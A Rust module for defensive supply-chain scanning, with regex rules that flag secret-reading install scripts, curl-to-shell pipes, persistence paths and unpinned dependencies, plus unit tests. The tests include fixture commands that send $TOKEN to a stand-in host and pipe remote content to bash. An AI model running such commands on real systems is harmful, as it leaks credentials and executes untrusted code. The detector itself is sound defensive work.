//! Supply-chain content rules used by package evaluation.
//! Rule groups preserve first-match precedence; independent groups accumulate.

use crate::supply_chain_package_eval::{EvalError, EvalResult};
use fancy_regex::Regex;
use serde_json::{Map, Value};
use std::sync::OnceLock;

struct Rule {
    group: u8,
    pattern: Regex,
    fields: [&'static str; 7],
    hint: Option<&'static str>,
}

fn rules() -> &'static [Rule] {
    static RULES: OnceLock<Vec<Rule>> = OnceLock::new();
    RULES.get_or_init(|| vec![
        Rule { group: 0, pattern: Regex::new("(?i)\"postinstall\"\\s*:\\s*\"(?:[^\"\\\\]|\\\\.)*(?:\\.env|\\.ssh|\\.aws|\\.netrc|password|secret|token|key)(?:[^\"\\\\]|\\\\.)*\"").expect("static supply-chain pattern"), fields: ["supply-chain.postinstall-secret-read", "secret", "critical", "strong", "Package postinstall script reads secret paths", "This package reads credential files during installation.", "postinstall reads secret path"], hint: None },
        Rule { group: 0, pattern: Regex::new("(?i)\"postinstall\"\\s*:\\s*\"(?:[^\"\\\\]|\\\\.)*(?:curl|wget|fetch|http)(?:[^\"\\\\]|\\\\.)*\"").expect("static supply-chain pattern"), fields: ["supply-chain.postinstall-network-send", "network", "high", "strong", "Package postinstall script makes network requests", "This package sends network traffic during installation.", "postinstall uses curl/wget/fetch"], hint: None },
        Rule { group: 0, pattern: Regex::new("(?i)\"(?:preinstall|install|postinstall|prepare|prepublish)\"\\s*:\\s*\"(?:[^\"\\\\]|\\\\.)*(?:curl|wget|bash|sh|python|node|exec|eval)(?:[^\"\\\\]|\\\\.)*\"").expect("static supply-chain pattern"), fields: ["supply-chain.install-lifecycle-exec", "execution", "high", "likely", "Package lifecycle script executes shell commands", "This package runs shell commands during install (postinstall/prepare/install).", "lifecycle script contains shell exec"], hint: None },
        Rule { group: 1, pattern: Regex::new("(?i)\\bnpx\\s+(?:--yes\\s+)?(?!ts-node|tsc\\b|prettier\\b|eslint\\b|jest\\b|mocha\\b|vitest\\b)[A-Za-z0-9@._/-]{3,}").expect("static supply-chain pattern"), fields: ["supply-chain.npx-remote-exec", "execution", "high", "likely", "npx executes a remote package without local install", "npx fetches and executes packages from npm on demand without pinning.", "npx remote execution"], hint: Some("may be a trusted dev tool like prettier or eslint") },
        Rule { group: 2, pattern: Regex::new("(?i)\\buvx\\s+[A-Za-z0-9._/-]{2,}").expect("static supply-chain pattern"), fields: ["supply-chain.uvx-remote-exec", "execution", "high", "likely", "uvx executes a remote Python package without local install", "uvx fetches and runs Python packages from PyPI without pinning.", "uvx remote execution"], hint: Some("may be a trusted dev tool") },
        Rule { group: 3, pattern: Regex::new("(?i)\\bpip(?:3)?\\s+install\\s+(?:--[^\\s]+\\s+)*git\\+https?://").expect("static supply-chain pattern"), fields: ["supply-chain.pip-install-git", "execution", "high", "strong", "pip installs a package directly from a git repository", "Installing from git bypasses PyPI integrity checks and can pull arbitrary code.", "pip install git+https"], hint: None },
        Rule { group: 4, pattern: Regex::new("(?i)\\bpip(?:3)?\\s+install\\s+\\.").expect("static supply-chain pattern"), fields: ["supply-chain.pip-local-build", "execution", "medium", "likely", "pip installs local package which may invoke build backend hooks", "Local pip install can run setup.py or pyproject.toml build hooks.", "pip install ."], hint: Some("common in dev workflows; verify build backend is trusted") },
        Rule { group: 5, pattern: Regex::new("(?i)\\bpython(?:3)?\\s+setup\\.py\\s+(?:install|develop|bdist|sdist|build)\\b").expect("static supply-chain pattern"), fields: ["supply-chain.setup-py-exec", "execution", "medium", "strong", "setup.py install/build executes arbitrary Python during packaging", "Running setup.py directly can execute arbitrary code in the build script.", "python setup.py install/build"], hint: None },
        Rule { group: 6, pattern: Regex::new("(?i)RUN\\s+.*?curl\\s+.*?\\|\\s*(?:bash|sh|python|node)").expect("static supply-chain pattern"), fields: ["supply-chain.dockerfile-curl-shell", "execution", "critical", "strong", "Dockerfile RUN pipes curl output to a shell", "This Dockerfile fetches and executes remote code during image build.", "Dockerfile RUN curl | bash"], hint: None },
        Rule { group: 7, pattern: Regex::new("(?i)\\bcurl\\s+.*?\\|\\s*(?:bash|sh|python|node|ruby)\\b").expect("static supply-chain pattern"), fields: ["supply-chain.curl-pipe-exec", "execution", "critical", "strong", "Script pipes curl output directly to a shell interpreter", "Piping remote content to bash/sh/python executes untrusted code.", "curl | bash/sh pattern"], hint: None },
        Rule { group: 8, pattern: Regex::new("(?i)uses:\\s+[A-Za-z0-9._/-]+@v\\d+(?:\\.\\d+)?(?!\\.\\d)\\b").expect("static supply-chain pattern"), fields: ["supply-chain.gh-action-mutable-tag", "supply_chain", "high", "strong", "GitHub Action uses a mutable version tag (vN or vN.N)", "Mutable tags can be moved to different commits by the action author.", "uses: action@vN"], hint: Some("acceptable if action author is highly trusted") },
        Rule { group: 8, pattern: Regex::new("(?i)uses:\\s+[A-Za-z0-9._/-]+@(?!(?:[0-9a-f]{40})\\b)[A-Za-z0-9._-]+").expect("static supply-chain pattern"), fields: ["supply-chain.gh-action-unpinned-sha", "supply_chain", "medium", "likely", "GitHub Action does not pin to a full commit SHA", "Using branch names or short refs risks inadvertent code change pickup.", "uses: action@branch/tag"], hint: None },
        Rule { group: 9, pattern: Regex::new("(?i)FROM\\s+[A-Za-z0-9._/:-]+:latest\\b").expect("static supply-chain pattern"), fields: ["supply-chain.docker-image-latest", "supply_chain", "medium", "likely", "Docker image uses the mutable :latest tag", "The :latest tag resolves to different image digests over time.", "FROM image:latest"], hint: None },
        Rule { group: 11, pattern: Regex::new("(?i)\\\"resolved\\\"\\s*:\\s*\\\"(?!https://registry\\.npmjs\\.org/)[^\\\"]+\\\"").expect("static supply-chain pattern"), fields: ["supply-chain.lockfile-source-drift", "supply_chain", "high", "strong", "Lockfile package resolved URL points outside official registry", "A non-registry resolved URL may indicate dependency confusion or substitution.", "resolved URL not from registry.npmjs.org"], hint: None },
        Rule { group: 12, pattern: Regex::new("(?i)\\\"integrity\\\"\\s*:\\s*\\\"\\\"").expect("static supply-chain pattern"), fields: ["supply-chain.lockfile-integrity-missing", "supply_chain", "high", "strong", "Lockfile entry has empty integrity hash", "A missing integrity hash removes tamper detection for this dependency.", "integrity field is empty string"], hint: None },
        Rule { group: 13, pattern: Regex::new("(?i)~?/\\.(?:bashrc|bash_profile|zshrc|profile|zprofile)\\b").expect("static supply-chain pattern"), fields: ["supply-chain.script-shell-profile", "persistence", "high", "strong", "Package script modifies shell profile", "This script writes to .bashrc/.zshrc which persists across shell sessions.", "shell profile modification in package script"], hint: None },
        Rule { group: 14, pattern: Regex::new("(?i)\\.git/hooks/[a-z\\-]+").expect("static supply-chain pattern"), fields: ["supply-chain.script-git-hooks", "persistence", "high", "strong", "Package script creates or modifies git hooks", "Git hooks can execute arbitrary code on every git operation.", ".git/hooks path in package script"], hint: None },
        Rule { group: 15, pattern: Regex::new("(?i)~/Library/LaunchAgents/").expect("static supply-chain pattern"), fields: ["supply-chain.script-launch-agent", "persistence", "critical", "strong", "Package script installs a macOS Launch Agent", "Launch Agents run on login and provide persistent code execution.", "LaunchAgents path in package script"], hint: None },
        Rule { group: 16, pattern: Regex::new("(?i)\\bcrontab\\s+-[el]\\b|\\b/etc/cron\\.").expect("static supply-chain pattern"), fields: ["supply-chain.script-cron", "persistence", "high", "strong", "Package script modifies cron jobs", "Cron entries provide persistent scheduled code execution.", "crontab or /etc/cron path in package script"], hint: None },
        Rule { group: 17, pattern: Regex::new("(?is)(?:NPM_TOKEN|NODE_AUTH_TOKEN)\\s*=\\s*\\S+\\s+(?:npm|pnpm|yarn|bun)\\s+publish\\b|(?:npm|pnpm|yarn|bun)\\s+publish\\b.*?(?:NPM_TOKEN|NODE_AUTH_TOKEN)\\s*=\\s*\\S+").expect("static supply-chain pattern"), fields: ["supply-chain.publish-with-token", "secret", "high", "likely", "npm publish command uses an auth token", "Inline auth tokens in publish commands can be exfiltrated via logs.", "NPM_TOKEN or NODE_AUTH_TOKEN inline in publish command"], hint: None },
    ])
}

fn signal(fields: [&str; 7], hint: Option<&str>) -> Map<String, Value> {
    let mut result = Map::new();
    for (key, value) in [
        "signal_id",
        "category",
        "severity",
        "confidence",
        "title",
        "plain_reason",
        "technical_detail",
    ]
    .into_iter()
    .zip(fields)
    {
        result.insert(key.into(), Value::String(value.into()));
    }
    for (key, value) in [
        ("detector", "supply-chain.content"),
        ("evidence_ref", "supply_chain_content"),
        ("redaction_level", "summary"),
    ] {
        result.insert(key.into(), Value::String(value.into()));
    }
    result.insert(
        "false_positive_hint".into(),
        hint.map_or(Value::Null, |v| Value::String(v.into())),
    );
    result.insert("advisory_id".into(), Value::Null);
    result
}

fn critical_image(content: &str) -> EvalResult<Option<Map<String, Value>>> {
    static PATTERN: OnceLock<Regex> = OnceLock::new();
    let pattern = PATTERN.get_or_init(|| {
        Regex::new("(?im)^\\s*FROM\\s+([A-Za-z0-9._/-]+:[A-Za-z0-9._-]+)\\b")
            .expect("static base image pattern")
    });
    const IMAGES: &[(&str, &str, &str)] = &[
        ("python:3.6.15", "Python 3.6 base image is end-of-life", "This exact Python base image tag is end-of-life and no longer receives security fixes."),
        ("node:12.22.12", "Node.js 12 base image is end-of-life", "This exact Node.js base image tag is end-of-life and no longer receives security fixes."),
    ];
    for capture in pattern.captures_iter(content) {
        let capture = capture.map_err(|e| {
            EvalError::Validation(format!("supply_chain_rule_evaluation_failed: {e}"))
        })?;
        let image = capture.get(1).expect("base image capture").as_str();
        if let Some(&(canonical, title, reason)) = IMAGES
            .iter()
            .find(|(key, _, _)| image.eq_ignore_ascii_case(key))
        {
            let detail = format!("FROM {canonical}");
            return Ok(Some(signal(
                [
                    "supply-chain.docker-base-image-known-critical",
                    "supply_chain",
                    "high",
                    "strong",
                    title,
                    reason,
                    &detail,
                ],
                None,
            )));
        }
    }
    Ok(None)
}

pub fn detect_supply_chain_risk(content: &str) -> EvalResult<Vec<Map<String, Value>>> {
    let mut signals = Vec::new();
    let mut matched_group = None;
    let mut image_checked = false;
    for rule in rules() {
        if !image_checked && rule.group > 10 {
            if let Some(signal) = critical_image(content)? {
                signals.push(signal);
            }
            image_checked = true;
        }
        if matched_group == Some(rule.group) {
            continue;
        }
        if rule.pattern.is_match(content).map_err(|e| {
            EvalError::Validation(format!("supply_chain_rule_evaluation_failed: {e}"))
        })? {
            signals.push(signal(rule.fields, rule.hint));
            matched_group = Some(rule.group);
        }
    }
    Ok(signals)
}

#[cfg(test)]
mod tests {
    use super::*;
    fn ids(content: &str) -> Vec<String> {
        detect_supply_chain_risk(content)
            .unwrap()
            .into_iter()
            .map(|mut s| s.remove("signal_id").unwrap().as_str().unwrap().to_owned())
            .collect()
    }
    #[test]
    fn secret_lifecycle_takes_precedence_over_network_and_execution() {
        assert_eq!(
            ids(r#"{"scripts":{"postinstall":"curl https://host/$TOKEN | bash"}}"#),
            [
                "supply-chain.postinstall-secret-read",
                "supply-chain.curl-pipe-exec"
            ]
        );
    }
    #[test]
    fn trusted_npx_and_pinned_action_do_not_trigger_remote_rules() {
        assert!(ids("npx eslint .
uses: actions/checkout@0123456789abcdef0123456789abcdef01234567")
        .is_empty());
        assert_eq!(
            ids("npx untrusted-package
uses: actions/checkout@v4"),
            [
                "supply-chain.npx-remote-exec",
                "supply-chain.gh-action-mutable-tag"
            ]
        );
    }
    #[test]
    fn exact_critical_images_and_independent_rules_preserve_order() {
        assert_eq!(
            ids("FROM NODE:12.22.12
FROM python:3.6.15
RUN curl https://host | bash"),
            [
                "supply-chain.dockerfile-curl-shell",
                "supply-chain.curl-pipe-exec",
                "supply-chain.docker-base-image-known-critical"
            ]
        );
        assert!(ids("FROM node:12.22.13").is_empty());
    }
}
